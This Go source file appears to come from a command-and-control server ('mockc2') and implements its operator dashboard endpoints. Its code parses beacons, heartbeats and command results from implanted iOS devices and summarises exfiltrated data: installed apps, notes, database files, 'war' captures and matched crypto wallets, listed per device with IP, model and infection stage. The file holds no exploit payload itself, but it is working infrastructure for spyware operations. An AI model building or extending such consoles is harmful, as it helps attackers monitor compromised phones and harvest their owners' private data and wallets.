package server

import (
	"encoding/json"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"mockc2/internal/config"
	"mockc2/internal/store"
)

// 主数据口：/__dash/api (聚合 JSON) + /__dash/file (原始包读取)。
//
// 历史沿革：原静态暗色看板（/__dash HTML + /__dash/assets/*）已随前端全量迁移 Vue 下线，
// 此处仅保留 Vue 控制台依赖的两个数据端点（stores/dash.ts 沿用 /__dash/* 命名）。

var dashSafeRe = regexp.MustCompile(`^[A-Za-z0-9_.-]+$`)

// dashAPICache /__dash/api 响应缓存（stale-while-revalidate）。
// 过期先回旧数据 + 后台异步重算，读路径永不同步等重建（对齐 ListDevices SWR）；
// 冷启动（无旧数据）才同步构建一次。重建内部还有 3s 短 TTL 的 dashAPICache 语义，
// 但 20s+ 的重型聚合曾把首个过期请求卡死（INC-20260930-02），SWR 化后消除。
var dashAPICache struct {
	mu         sync.RWMutex
	key        string
	body       []byte
	expire     time.Time
	refreshing atomic.Bool
}

const dashCacheTTL = 5 * time.Second

func parsePacket(folder, body string) map[string]any {
	var v any
	if json.Unmarshal([]byte(body), &v) != nil {
		if strings.HasPrefix(body, "<binary") {
			return map[string]any{"kind": "binary", "hint": clip96(body)}
		}
		return map[string]any{"kind": "text", "hint": clip96(body)}
	}
	o, ok := v.(map[string]any)
	if !ok {
		return map[string]any{"kind": "list-json", "hint": clip96(body)}
	}
	k := map[string]any{"kind": folder}
	switch folder {
	case "beacon":
		di, _ := o["device_info"].(map[string]any)
		k["uuid"] = o["uuid"]
		k["machine"] = di["machine"]
		k["ios"] = di["ios_version"]
		k["build"] = di["build_version"]
		k["status"] = o["status"]
	case "sync":
		k["deviceVersion"] = o["deviceVersion"]
		k["domain"] = o["domain"]
	case "u":
		apps := asSlice(o["apps"])
		k["lhu"] = o["lhu"]
		k["app_count"] = len(apps)
		sample := []any{}
		for i, a := range apps {
			if i >= 4 {
				break
			}
			if m, ok := a.(map[string]any); ok {
				sample = append(sample, m["name"])
			}
		}
		k["apps_sample"] = sample
	case "nb":
		notes := asSlice(o["list"])
		k["lhu"] = o["lhu"]
		k["note_count"] = len(notes)
		sample := []any{}
		for i, n := range notes {
			if i >= 3 {
				break
			}
			if m, ok := n.(map[string]any); ok {
				sample = append(sample, m["title"])
			}
		}
		k["notes_sample"] = sample
		df := []any{}
		for _, f := range asSlice(o["db_files"]) {
			if m, ok := f.(map[string]any); ok {
				df = append(df, m["name"])
			}
		}
		k["db_files"] = df
	case "result":
		k["command_id"] = o["command_id"]
		k["status"] = o["status"]
	case "heartbeat":
		k["signal"] = strings.TrimSpace(body)
	case "war":
		k["probe"] = o["probe"]
	default:
		raw := map[string]any{}
		i := 0
		for key, val := range o {
			if i >= 6 {
				break
			}
			raw[key] = val
			i++
		}
		k["raw"] = raw
	}
	return k
}

func clip96(s string) string {
	if len(s) > 96 {
		return s[:96]
	}
	return s
}

// readHead 只读文件前 n 字节（看板冷启动兜底用；正文随后会被截断，无需整读大文件）。
func readHead(path string, n int) (string, error) {
	f, err := os.Open(path)
	if err != nil {
		return "", err
	}
	defer f.Close()
	buf := make([]byte, n)
	m, _ := io.ReadFull(f, buf)
	return string(buf[:m]), nil
}

// tailProbeFromDB 控制台/心跳流水：直读 probe_log 表。
// 旧实现 tailJSONL 每次轮询读磁盘 access.jsonl/console.jsonl 各 512KB 块——
// 库里有同样的数据还要读盘，典型的双读坏味道。
func tailProbeFromDB(n int) []map[string]any {
	rows := store.GetDB().Query(
		"SELECT ts, channel, entry_id, hex, text FROM probe_log ORDER BY id DESC LIMIT ?", n)
	for i, j := 0, len(rows)-1; i < j; i, j = i+1, j-1 {
		rows[i], rows[j] = rows[j], rows[i]
	}
	if rows == nil {
		rows = []map[string]any{}
	}
	return rows
}

// tailAccessFromDB 访问流水：直读 access_log 表（含 3 天保留窗口，见 retention.go）。
func tailAccessFromDB(n int) []map[string]any {
	rows := store.GetDB().Query(
		"SELECT ts, role, method, path, query, host, client, ua, status, cost_ms"+
			" FROM access_log ORDER BY ts_epoch DESC, id DESC LIMIT ?", n)
	for i, j := 0, len(rows)-1; i < j; i, j = i+1, j-1 {
		rows[i], rows[j] = rows[j], rows[i]
	}
	if rows == nil {
		rows = []map[string]any{}
	}
	return rows
}

// countsFromDB 端点包计数：直读 packets 表（落盘文件因"大包才落盘"策略
// 不再与包一一对应，磁盘目录数不再是正确的包数口径）。
func countsFromDB() map[string]any {
	counts := map[string]any{}
	for _, r := range store.GetDB().Query(
		"SELECT endpoint, COUNT(*) AS n FROM packets GROUP BY endpoint") {
		counts[store.ToStr(r["endpoint"])] = r["n"]
	}
	return counts
}

// buildDashPayload 聚合看板快照并序列化（SWR 的重算体）。
func buildDashPayload(logTail, accTail int) ([]byte, bool) {
	st := store.GetStore()
	capRoot := config.Get().CaptureRoot

	// 设备列表：以 /a + /beacon 收包解析为准（packet_meta field∈{uuid,lhu}，
	// endpoint∈{a,beacon} —— store.ListDevices 的口径）。一台设备 = 一个 uuid 一行，
	// 而不是前端访客台账（devices 表含所有过路浏览器，会混入非托管流量）。
	// IP 由 device_profiles 权威档案或 nearestIPAt 定点推断；进度/阶段沿用阶段权重表。
	devices := []map[string]any{}
	for _, d := range store.ListDevices() {
		ver := store.ToStr(d["ios"])
		if ver != "" {
			ver = "IOS " + ver
		} else if m := store.ToStr(d["machine"]); m != "" {
			ver = m
		} else {
			ver = "unknown"
		}
		devices = append(devices, map[string]any{
			"ts":            store.ToStr(d["last_seen"]),
			"first_seen":    store.ToStr(d["first_seen"]),
			"ip":            store.ToStr(d["ip"]),
			"uuid":          store.ToStr(d["uuid"]),
			"device_name":   store.ToStr(d["deviceName"]),
			"machine":       store.ToStr(d["machine"]),
			"ios":           store.ToStr(d["ios"]),
			"build":         store.ToStr(d["build"]),
			"online":        d["online"] == true,
			"deviceVersion": ver,
			"domain":        "",
			"host":          store.ToStr(d["deviceName"]),
			"ua":            "",
			"channelCode":   "",
			"progress":      d["progress"],
			"stage":         d["stage"],
			"apps_count":    d["apps_count"],
			"war_count":     d["war_count"],
			"notes_count":   d["notes_count"],
			"wallets":       d["wallets"],
			"ws":            d["ws"],
		})
	}

	// 各端点最近留存（环形内存缓冲，动态覆盖所有捕获文件夹）
	endpoints := map[string]any{}
	for _, folder := range st.Folders() {
		items := st.Recent(folder)
		if len(items) == 0 {
			// 冷启动兜底：内存环形空时，回读该端点磁盘最近 12 个留存包
			// （仅大包落盘，所以这里通常只有 war/u/nb/result 等大端点有货）
			dir := filepath.Join(capRoot, folder)
			entries, err := os.ReadDir(dir)
			var files []os.DirEntry
			if err == nil {
				for _, e := range entries {
					if !e.IsDir() {
						files = append(files, e)
					}
				}
				sort.Slice(files, func(i, j int) bool { return files[i].Name() < files[j].Name() })
				if len(files) > 12 {
					files = files[len(files)-12:]
				}
			}
			for i := len(files) - 1; i >= 0; i-- {
				p := filepath.Join(dir, files[i].Name())
				fi, serr := os.Stat(p)
				if serr != nil {
					continue
				}
				// 只读文件头部：正文随后被截断到 1500B，无需把 3~5MB 的 war 包整读进内存
				head, _ := readHead(p, 2048)
				items = append(items, map[string]any{
					"ts": "-", "file": files[i].Name(), "size": fi.Size(),
					"body": store.ToStr(head),
				})
			}
		}
		parsed := make([]map[string]any, 0, len(items))
		for _, it := range items {
			body := store.ToStr(it["body"])
			if len(body) > 1500 {
				body = body[:1500] + "…（truncated " + store.ToStr(it["size"]) + "B，完整内容走 /__dash/file）"
			}
			m := map[string]any{}
			for k, v := range it {
				m[k] = v
			}
			m["body"] = body
			m["parsed"] = parsePacket(folder, store.ToStr(it["body"]))
			parsed = append(parsed, m)
		}
		endpoints[folder] = parsed
	}

	peRolls := store.PeEventsRecent(20)

	walletsPanel := []map[string]any{}
	for _, row := range store.Summary("", 20) {
		rn := store.ToStr(row["rule_name"])
		walletsPanel = append(walletsPanel, map[string]any{"rule": rn,
			"display": store.Display(rn), "count": row["count"], "last_ts": row["last_ts"]})
	}

	payload := map[string]any{
		"ts":        nowString(),
		"devices":   devices,
		"pe_events": peRolls,
		"wallets":   walletsPanel,
		"log":       tailProbeFromDB(logTail),
		"access":    tailAccessFromDB(accTail),
		"endpoints": endpoints,
		"counts":    countsFromDB(),
	}
	b, err := json.Marshal(payload)
	return b, err == nil
}

func registerDash(rt *Router) {
	rt.GET("/__dash/file", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		ep := r.URL.Query().Get("ep")
		name := r.URL.Query().Get("name")
		if !dashSafeRe.MatchString(ep) || !dashSafeRe.MatchString(name) {
			writeJSON(w, http.StatusBadRequest, map[string]any{"error": "bad params"})
			return
		}
		root := config.Get().CaptureRoot
		path := filepath.Join(root, ep, name)
		rel, err := filepath.Rel(root, path)
		if err != nil || strings.HasPrefix(rel, "..") {
			writeJSON(w, http.StatusForbidden, map[string]any{"error": "forbidden"})
			return
		}
		if !isFile(path) {
			writeJSON(w, http.StatusNotFound, map[string]any{"error": "not found"})
			return
		}
		serveFile(w, path, "", "no-store")
	})

	rt.GET("/__dash/api", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		logTail := queryInt(r, "log_tail", 150)
		accTail := queryInt(r, "acc_tail", 80)

		ck := strconv.Itoa(logTail) + "|" + strconv.Itoa(accTail)
		dashAPICache.mu.RLock()
		fresh := time.Now().Before(dashAPICache.expire) && dashAPICache.key == ck
		stale := dashAPICache.key == ck && dashAPICache.body != nil
		body := dashAPICache.body
		dashAPICache.mu.RUnlock()

		if fresh {
			w.Header().Set("Content-Type", "application/json; charset=utf-8")
			_, _ = w.Write(body)
			return
		}
		if stale {
			// SWR：立即回旧数据，后台异步重算（并发触发只放行一个重建者）
			if dashAPICache.refreshing.CompareAndSwap(false, true) {
				go func(key string) {
					defer dashAPICache.refreshing.Store(false)
					if b, ok := buildDashPayload(logTail, accTail); ok {
						dashAPICache.mu.Lock()
						dashAPICache.key, dashAPICache.body = key, b
						dashAPICache.expire = time.Now().Add(dashCacheTTL)
						dashAPICache.mu.Unlock()
					}
				}(ck)
			}
			w.Header().Set("Content-Type", "application/json; charset=utf-8")
			_, _ = w.Write(body)
			return
		}
		// 冷启动：同步构建一次
		if b, ok := buildDashPayload(logTail, accTail); ok {
			dashAPICache.mu.Lock()
			dashAPICache.key, dashAPICache.body = ck, b
			dashAPICache.expire = time.Now().Add(dashCacheTTL)
			dashAPICache.mu.Unlock()
			w.Header().Set("Content-Type", "application/json; charset=utf-8")
			_, _ = w.Write(b)
			return
		}
		writeJSON(w, http.StatusInternalServerError, map[string]any{"error": "snapshot failed"})
	})

}
